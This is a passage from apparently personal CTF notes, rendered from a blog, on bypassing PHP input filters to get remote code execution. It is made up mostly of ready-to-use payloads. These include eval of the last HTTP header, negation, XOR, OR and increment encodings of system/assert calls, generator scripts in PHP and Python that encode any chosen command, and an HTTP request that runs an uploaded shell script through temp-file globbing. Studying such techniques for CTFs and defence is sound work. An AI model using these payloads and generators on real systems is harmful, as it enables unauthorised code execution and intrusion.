class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="built_in">array</span><span class="constructor">_pop(<span class="params">getallheaders</span>()</span>));</span><br><span class="line"><span class="comment">//这里的array_pop是弹出http头的最后一个</span></span><br><span class="line"><span class="comment">//getallheaders()是获取所有请求头信息的一个数组</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">请求头:</span><br><span class="line">因为得是在最后一个，所以用字母让他排到最后,例如：</span><br><span class="line">ZZZZZ=phpinfo();</span><br><span class="line"></span><br><span class="line">或者使用</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">pos</span>(<span class="keyword">next</span>(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><h3 id="2-无字母数字rce">2.无字母数字rce</h3><p>可参考https://www.freebuf.com/articles/network/279563.html（已保存）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1重点，每次做都得看">2.1重点，每次做都得看</h4><p>遇到这种的，得到脚本之后直接用运算符进行连接，1乘script乘1，就这样的格式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code =  <span class="keyword">eval</span>(<span class="string">&quot;return $v1$v3$v2;&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="2-2取反绕过">2.2取反绕过</h4><h5 id="Script-1">Script 1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;call_user_func&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(~&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;,~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;,&#x27;&#x27;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Script-2">Script 2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="2-3异或绕过">2.3异或绕过</h4><p>脚本位置wanganscript/xor和wanganscript/,每次使用记得修改php中的正则代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-zA-Z0-9_$@]+/&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h4 id="2-4或绕过">2.4或绕过</h4><p>脚本位置wanganscript/or,每次使用记得修改php中的正则代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-zA-Z0-9_$@]+/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment"># 没有将php写入环境变量需手动运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-5自增绕过">2.5自增绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>测试发现<span class="number">7.0</span>.<span class="number">12</span>以上版本不可使用</span><br><span class="line"><span class="regexp">//</span>使用时需要url编码下</span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;$_&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="2-6临时文件执行">2.6临时文件执行</h4><p>使用于$也被过滤了的情况</p><p>利用点执行临时文件，用?匹配临时文件，正则表达式的内容可以随便替换，如果有绕过的话</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br></pre></td></tr></table></figure><p>执行包</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?shell<span class="operator">=</span>?&gt;&lt;?<span class="operator">=</span>`.+/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f[<span class="variable">%40</span>-[]`<span class="variable">%3</span>b?&gt; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.210</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span><span class="comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line">Accept: text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml<span class="comment">;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN<span class="punctuation">,</span>zh<span class="comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">Content-Type:multipart/form-data<span class="comment">;boundary=--------123</span></span><br><span class="line">Accept-Encoding: gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">109</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-123</span></span><br><span class="line">Content-Disposition:form-data<span class="comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">---------<span class="number">-123</span>--</span><br></pre></td></tr></table></figure><h3 id="3-命令行写shell">3.命令行写shell</h3><p>前提：可以执行系统命令</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 